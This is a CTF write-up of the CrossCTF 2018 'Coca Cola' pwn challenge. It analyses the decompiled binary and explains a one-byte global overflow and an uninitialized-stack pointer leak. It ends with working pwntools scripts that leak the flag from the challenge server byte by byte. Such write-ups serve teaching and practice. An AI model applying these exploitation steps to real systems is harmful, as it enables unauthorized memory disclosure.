# CrossCTF Finals 2018 : Coca Cola (Pwn)
### First Blood by : TinyBoxer

## Static Analysis
Running ```file cocacola``` gives:
```
cocacola: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=76986b77e7025662406398594dd7c100f7e35c16, not stripped
```

Now on to the code ...
``` c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int result; // eax
  __off_t v5; // rsi
  int fd; // [rsp+Ch] [rbp-B4h]
  struct stat stat_buf; // [rsp+20h] [rbp-A0h]
  unsigned __int64 v8; // [rsp+B8h] [rbp-8h]

  v8 = __readfsqword(0x28u); // these are canaries btw
  setvbuf(stdin, 0LL, 2, 0LL); //disallows buffering
  setvbuf(stdout, 0LL, 2, 0LL);//disallows buffering
  setvbuf(stderr, 0LL, 2, 0LL);//disallows buffering
  v3 = time(0LL);
  srand(v3); //initalize random seed
  fd = open("flag_page", 0, 384LL);
  memset(&stat_buf, 0, sizeof(stat_buf));
  if ( fstat(fd, &stat_buf) == -1 )
  {
    perror("Error getting the file size");
    result = -1;
  }
  else
  {
    v5 = stat_buf.st_size;
    mmap((void *)0x700B1000, stat_buf.st_size, 1, 1, fd, 0LL);
    printf("Do you want to flip the flag switch? (y/n) ");
    __isoc99_scanf((__int64)"%2s", (__int64)&flag);
    coca();
    cola();
    puts("Did you get it? If not try again.");
    result = 0;
  }
  return result;
}
```

The program opens a file called ```flag_page```. It clears out a ```stat_buf``` region of memory, then uses as a ```stat``` struct when ```fstat(fd, &stat_buf)``` is called. If ```fstat``` succeeds, ```mmap(0x700B100, stats_buf.size, 1, 1, fd, 0)``` is called.

Looking at [mmap documentation](http://man7.org/linux/man-pages/man2/mmap.2.html), we see that the two ```1```s that are in the earlier mmap call are for the ```prot``` and ```flags``` arguments. However, note that for the ```fd``` argument, we are passing ```flag_page```'s fd, intending to copy the file content into our allocated memory.

Next, it asks us about flipping flag switches (to which the answer is not ```y```, as we will see later). It reads in 2 bytes into the ```flag``` global variable then proceeds to call ```coca()``` and then ```cola()```

```c
unsigned __int64 coca()
{
  char buf; // [rsp+0h] [rbp-110h]
  unsigned __int64 v2; // [rsp+108h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts(art);
  read(0, &buf, 0xFFuLL);
  if ( flag_denied == 0xC5u )
    read(0, &something, 1uLL);
  return __readfsqword(0x28u) ^ v2;
}
```

We begin by printing some pretty art, after which we read in 255 bytes into memory. Checking the offsets, we see that there is no overflow here. Next, a global variable ```flag_denied``` is compared to ```0xc5```, and if it equal we read 1 byte into ```something```, another global variable.

```c
unsigned __int64 cola()
{
  int v0; // eax
  signed __int64 v2; // [rsp+0h] [rbp-60h]
  signed __int64 v3; // [rsp+8h] [rbp-58h]
  __int64 v4; // [rsp+10h] [rbp-50h]
  __int64 v5; // [rsp+18h] [rbp-48h]
  __int64 v6; // [rsp+20h] [rbp-40h]
  __int64 v7; // [rsp+28h] [rbp-38h]
  __int64 v8; // [rsp+30h] [rbp-30h]
  int v9; // [rsp+38h] [rbp-28h]
  __int16 v10; // [rsp+3Ch] [rbp-24h]
  const char *v11; // [rsp+48h] [rbp-18h]
  unsigned __int64 v12; // [rsp+58h] [rbp-8h]

  v12 = __readfsqword(0x28u);
  v0 = rand();
  v3 = v0
     - 10000000000LL
     * (((signed __int64)((unsigned __int128)(0x36F9BFB3AF7B757LL * (signed __int128)v0) >> 64) >> 27)
      - ((signed __int64)v0 >> 63))
     + 1;
  if ( something )
  {
    v2 = '\x137';
    strcpy(v4, "Limited Edition Coca Cola - Product of Mexico");
    v11 = (__int64)"Invalid internal error.";
  }
  puts("Here's your randomly generated coke can!");
  printf("Version: V.%lu\n", v2, v2);
  printf("Serial Number: %lu\n", v3);
  printf("Title: %s\n", &v4);
  if ( flag == 0x44 && v11 )
  {
    puts("Errors were found.");
    printf("Error: %s\n", v11);
  }
  return __readfsqword(0x28u) ^ v12;
}
```

In this method, we get a random number then do some math to get produce another value, then save it into ```v3```. If ```something``` is true, we initalize variables ```v2```, ```v4``` and ```v11```. Note that ```v11``` has a pointer to some string, not the string itself. Next, we print out some info, then check if the ```flag``` variable is ```0x44``` and if ```v11``` isn't ```NULL```, and print ```v11``` out in a ```print("Error: %s\n")```.

## The Solution
We see that if ```something``` is ```0``` (also called ```NULL```), when we print out info in ```cola()```, it prints out values that are uninitialized. Usually, these are values from the previous function call that is made at the same 'level' as the current function (e.g main->coca is on the same 'level' as main->cola but main->cola is not on the same 'level' as main->cola->puts). That function is ```coca()```, based on main()'s code. If we look at the ```read(0, &buf, 0xff)```, we see that it reads 0xff bytes into buf, which is at rbp-0x110. All the variables in ```cola()``` are from rbp-0x60 onwards, so we can see that we can control all the variables in ```cola``` except ```v0```, ```v3``` and ```v12```. Note that ```cola()``` prints out v11 in ```printf("Error: %s\n", v11)```, interpreting it as a string, as long as ```flag``` is ```0x44```. Thus, we can print out arbitrary memory since we can control v11! We can even print out the contents of ```flag_page``` by setting v11 to ```0x700B1000```

So far, we need to set ```flag``` to ```0x44```, ```something``` to 0, and we also need to set ```v11``` to ```0x700B10000``` (this can be done in ```coca()```'s ```read(0, &buf, 0xff)```)

Checking the program, we see that something is actually 1 by default
```c
.data:00000000002117F8 something       db    1
```
The only place we can change ```something``` is in ```coca()```:
```
if ( flag_denied == 0xC5u )
    read(0, &something, 1uLL);
```
and it seems we need to set ```flag_denied``` to ```0xc5``` first. However, ```flag_denied``` is ```0``` by default, and there is no other place where it is set:
```
.bss:00000000002117FD                 public flag
.bss:00000000002117FD flag            db    ? ;               ; DATA XREF: cola+12E↑o
.bss:00000000002117FD                                         ; main+14A↑o
.bss:00000000002117FE                 public flag_denied
.bss:00000000002117FE flag_denied     db    ? ;               ; DATA XREF: coca+42↑o
.bss:00000000002117FF                 db    ? ;
```
Hold on, dont we read 2 bytes into ```flag``` in ```main()```? Here it says that ```flag``` is only 1 byte (Note the addresses in left. My tool repeats addresses when delivering information to give .. more information). Thus, we have a overflow, and we can write 1 byte into ```flag_denied```.

So far, the plan is:
Set ```flag``` and ```flag_denied``` to 0x44 and 0xc5 respectively, by sending ```\x44\xc5``` to ```__isoc99_scanf((__int64)"%2s", (__int64)&flag);``` in ```main()```.

Then, set v11 (at rbp-0x18) to ```0x700B1000``` in ```read(0, &buf, 0xff)``` in ```coca()``` (buf is rbp-0x110, so we have 0x110-0x18 = 0xf8 characters of padding).
</br>Thus, we send ```'a'*0xf8+p64(0x700B1000+i*32)[:-1]```. The ```[:-1]``` is to leave out the last character, as p64() gives 8 bytes but we can only afford to send 7 bytes (0ff-0f8 = 7). 

Next, we send ```\x00``` to ```read(0, &something, 1)```

Putting it all together:
```python
from pwn import *
p = remote('ctf.pwn.sg', 4001)

p.sendafter("Do you want to flip the flag switch? (y/n) ", '\x44\xC5')
p.send('a'*0xf8+p64(0x700B1000)[:-1])
p.send('\x00')
p.recvuntil('Error: ')
print(p.recvline())
```

However ... we get 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC', which isn't the flag, obviously. But 'C' is the first letter of the flag that we expect. Perhaps the file has null bytes that force printf() to stop printing, and the each character of the flag is repeated as above, followed by a null byte? This, along with the ```puts("Did you get it? If not try again.");``` in ```main()``` imply that we have to repeat our exploit for each character in the flag (we also need to offset our value to v11 by 32*i, where i is the index of the character).
<br/>Since we don't know how long the flag is, we just repeat our exploit, for example, 50 times and print what we have so far if the program segfaults early.
```python
from pwn import *
 
s = ''
  
for i in range(50):
    try:
        p = remote('ctf.pwn.sg', 4001)
  
        p.sendafter("Do you want to flip the flag switch? (y/n) ", '\x44\xC5')
        p.send('a'*0xf8+p64(0x700B1000+i*32)[:-1])
        p.send('\x00')
        p.recvuntil('Error: ')
        s += p.recv(1)
    except:
        break
print(s)
```